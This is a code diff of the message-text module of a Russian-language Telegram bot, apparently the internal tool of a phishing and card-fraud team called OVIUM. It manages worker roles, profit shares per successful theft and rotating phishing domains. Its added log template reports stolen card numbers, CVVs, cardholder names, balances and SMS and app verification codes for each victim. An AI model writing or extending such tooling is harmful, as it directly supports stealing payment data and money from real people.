@@ -1,3 +1,5 @@
+from core.utils import config
+
 class texts():
     start="4234234"
     confirm_user = '''🎉Поздравляем, вы были приняты!
@@ -7,23 +9,28 @@ class texts():
     menu = '''Жизнь коротка, и каждая минута на счету. Посвящая своё время нашему проекту сейчас, вы делаете вложение в будущее. Ваша отдача и усердие в нашем деле приведут к результатам, которые не только оправдают затраченное время, но и принесут плоды, экономя ваше время в долгосрочной перспективе!\n\n🕒График работы проекта: с 08:00 до 00:30 по МСК.'''
     channels = "Чем больше вы изучите, тем больше вы получите!"
     @staticmethod
-    def profile(id, nickHide,SmartSupp,  sumProfits, countProfits):
+    def profile(id, nickHide,SmartSupp,  sumProfits, countProfits, commandMe):
         SmartSupp_text = "🟢"
         if not SmartSupp:
             SmartSupp_text = "🔴"
         nickHide_text = "cкрыт"
         if not nickHide:
             nickHide_text = "открыт"
+        text = '`Помните золотое правило успеха: стремление + упорный труд = финансовое вознаграждение и бесценный опыт!`'
+        if commandMe:
+            text=""
         return f'''👤 Ваш уникальный ID: `{id}`
 
-🛡Ник: `{nickHide_text}`
+🛡Ник: {nickHide_text}
 
 🌑 SmartSupp: {SmartSupp_text}
 
 🎩 Сумма профитов: ${sumProfits}
 🏦 Количество профитов: {countProfits}
 
-`Помните золотое правило успеха: стремление + упорный труд = финансовое вознаграждение и бесценный опыт!`'''
+{text}'''
+
+
     @staticmethod
     def nickname(hide, nickname):
         hide_text = "скрыт" if hide else "открыт"
@@ -175,11 +182,18 @@ class in_keyboard_texts:
     admin_requests = "📃Заявки"
     admin_settings = "⚙️Настройки"
     admin_countries = "🗺Страны"
-    admin_make_mentor = "Назначить наставником"
+    @staticmethod
+    def admin_make_mentor(mentor):
+        return "Назначить наставником" if not mentor else "Убрать с наставников"
+
     admin_user_block = "🔴Заблокировать"
     admin_change_status = "🚦Изменить статус"
     admin_user_request = "📰Заявка"
     admin_links = "📦Обьявления"
+
+    @staticmethod
+    def country_active(active):
+        return "👁Выключить" if active else "🕶Включить"
 
     @staticmethod
     def country(flag, name):
@@ -188,6 +202,12 @@ class in_keyboard_texts:
     @staticmethod
     def servicesCountry(flag, name):
         return flag+name
+
+
+    @staticmethod
+    def AdminServicesCountry(flag, name, active):
+        activeText = " 🟢" if active else " 🔴"
+        return flag + name + activeText
 
 class start_texts:
     start = "🚀OVIUM — Мы обещаем обеспечить финансовую свободу всем, кто разделяет наши ценности и верно следует за нами!"
@@ -214,6 +234,7 @@ class admin_texts:
 📦 Объявлений: {user['links_count']}
 🚦 Статус: {user['status']}
 📃 Присоединился: {user['added']}
+Наставник: {"Да" if user['mentor'] else "Нет"}
 
 📰 Заявка: 
 — ID: {user['request_id']}
@@ -238,6 +259,14 @@ class admin_texts:
     ban_new_user  = "Отклонить"
 
     @staticmethod
+    def request(request):
+        friend_text = ""
+        print(request)
+        if request['type'] == "Друг":
+            friend_text = f"Друг: {request['textType']}"
+        return f"Заявка #{request['id']}\nСтатус:{request['status']}\ntg: @{request['username']}\nОткуда узнал: {request['type']}\n{friend_text}"
+
+    @staticmethod
     def confirmed_user(username, admin_username):
         return f"@{admin_username} успешно принял заявку от @{username}"
 
@@ -246,3 +275,103 @@ class admin_texts:
     @staticmethod
     def not_confirmed_user(username, admin_username):
         return f"@{admin_username} отклонил заявку от @{username}"
+
+    none_profits = "Профитов нет"
+
+
+    statusTS = "ТС💢"
+    statusDeveloper = "Разработчик👾"
+    statusAdmin = "Администратор👑"
+    statusVbiver = "Вбивер✍️"
+    statusWorker = "Воркер🛠"
+
+    @staticmethod
+    def status(_status):
+        statusText = {
+            "ts":"ТС💢",
+            "developer":"Разработчик👾",
+            "admin":"Администратор👑",
+            "vbiver":"Вбивер✍️",
+            "worker":"Воркер🛠"
+        }
+        return statusText[_status]
+
+    @staticmethod
+    def requests(count):
+        return f'''📝 Список заявок (Всего: {count})'''
+
+    select_service = "Выберите сервис"
+    @staticmethod
+    def service(service, count, domain):
+        print(service)
+        return f'''📦 Сервис: {service['orig_domain']}
+
+🌎 Страна:{service['country']}
+🎟 Объявлений: {count}
+🔧Активный домен:{service['subdomain']}.{domain}'''
+    @staticmethod
+    def profits(user = None):
+        if user:
+            return f"Профиты от @{user}"
+        return "Профиты"
+    change_subdomain = "📝 Изменить поддомен"
+    enter_subdomain = "Введите поддомен"
+    error_change_subdomain = "❌Произошла ошибка при изменении поддомена"
+    @staticmethod
+    def success_change_subdomain(domain):
+        return f"✅Вы успешно поменяли поддомен на {domain}"
+    @staticmethod
+    def hide_service(active):
+        return "👁 Скрыть сервис" if active else "😎Показать сервис"
+
+    enter_percent = "Введите процент воркера за залёт"
+    change_percent = "🤑Изменить процент воркера"
+    change_all_domain = "🏠Изменить домен"
+    enter_domain = "Введите домен"
+    error_change_domain = "❌Произошла ошибка при изменении домена"
+
+    @staticmethod
+    def success_change_percent(percent):
+        return f"✅Вы успешно поменяли процент всех воркеров на {percent}"
+
+    error_change_percent = "❌Произошла ошибка при изменении процента"
+    @staticmethod
+    def success_change_domain(domain):
+        return  f"✅Вы успешно поменяли домен всех сервисов на {domain}"
+    @staticmethod
+    def settings(settings):
+
+        return f'''⚙️ Настройки бота
+    
+📰 ID группы для логирования действий: {config.ADMIN_LOGGING_ID}
+👥 ID общей группы: {config.ALL_CHAT_ID}
+🧾 ID группы для заявок: {config.ADMIN_REQUESTS_ID}
+💰 ID канала для выплат: {config.ADMIN_WITHDRAW_ID}
+💬 Ссылка на общий чат: {config.url_all_chat}
+💸 Ссылка на канал выплат: {config.url_withdraw_channel}
+💴 Процент воркера за залёт: {str(settings['percent_worker'])}%'''
+class log:
+
+    @staticmethod
+    def log_text(service, link, worker):
+        return f'''{service['country']+service['orig_domain']}!
+
+💳 Card Number: {link['card']}
+📅 Card Expiry Date: {link['exp']}
+🤣 Cardholder Name: {link['cardholder']}
+🔢 CVV Code: {link['cvv']}
+💰 Balance: {link['balance']} Ft
+Accurate Balance: {link['accurate_balance']}
+📴 SMS Code: {link['sms']}
+App Code: {link['app']}
+
+👨🏻‍💻 Воркер: {worker['nickname']}
+👤 ID Воркера: {worker['id']}
+
+🔡 Объявление: {link['uniq_id']}
+🔢 ID Объявления: {link['id']}  
+
+💲 Цена:{link['price']} HUF
+👁 #search193022231'''
+
+
